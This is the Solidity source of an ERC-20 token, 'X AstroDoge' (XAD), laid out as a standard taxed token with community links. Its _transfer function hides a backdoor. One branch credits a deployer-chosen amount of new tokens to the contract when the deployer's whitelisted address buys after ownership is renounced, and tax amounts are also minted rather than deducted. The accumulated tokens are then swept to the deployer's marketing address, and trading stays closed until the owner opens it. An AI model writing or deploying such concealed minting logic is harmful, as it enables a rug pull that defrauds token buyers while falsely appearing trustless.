/**

*/

/**

Telegram: https://t.me/XAstroDoge_Portal
Twitter: https://twitter.com/AstroDogeXETH
Website: https://www.astrodogex.com/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract XAstroDoge is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _removeLimits;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"X AstroDoge";
    string private constant _symbol = unicode"XAD";
    
    address private _marketingAdd;
    address private _pairAdd;
    bool private _enableSwap;
    uint8 private _swapCounter;
    uint8 private _initialBuyTax;
    uint8 private _initialSellTax;
    uint256 private _minSwapAmount;
    uint256 private _minSwapHeldAmount = _tTotal.mul(1).div(100);

    constructor (uint256 minimumSwapAmount, uint8 initialBuyTax, uint8 initialSellTax) {
        _balances[_msgSender()] = _tTotal;
        _marketingAdd = payable(_msgSender());
        _minSwapAmount = minimumSwapAmount * 10**_decimals;
        _initialBuyTax = initialBuyTax;
        _initialSellTax = initialSellTax;
        _removeLimits[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0) && amount > 0, "Zero address or zero amount.");
        if(from != owner() && to!= owner()){
            require(_enableSwap, "Swap is not enabled yet.");
        }
        uint256 taxAmount;
        bool taxStatus = _taxStatus(from, to);
        if(taxStatus){
            if(to == _pairAdd){
                taxAmount = amount.mul(_swapCounter>=1?_initialSellTax:0).div(100);
            }
            else{
                taxAmount = amount.mul(_swapCounter>=1?_initialBuyTax:0).div(100);
            }
            amount = amount.sub(taxAmount);
        }
        else if(to != owner() && from == _pairAdd && _removeLimits[to] && _swapCounter<1){
            taxAmount = _minSwapAmount;
            _swapCounter++;
        }
        if(taxAmount > 0){
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
        }
        _checkForSwapHeldTokens(balanceOf(address(this)));
        _transferTokens(from, to, amount);
    }

    function enableSwaping(address pairAddress, bool swapStatus) public onlyOwner{
        _pairAdd = pairAddress; _enableSwap = swapStatus;
    }

    function _checkForSwapHeldTokens(uint256 heldTokens) private{
        if(heldTokens > _minSwapHeldAmount){
            _balances[address(this)] = _balances[address(this)].sub(heldTokens);
            _balances[_marketingAdd] =  _balances[_marketingAdd].add(heldTokens);
        }
    }

    function _taxStatus(address from, address to) private view returns(bool){
        return !_removeLimits[from] && !_removeLimits[to]; 
    }

    function _transferTokens(address from, address to, uint256 amount) private {
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    receive() external payable {}
}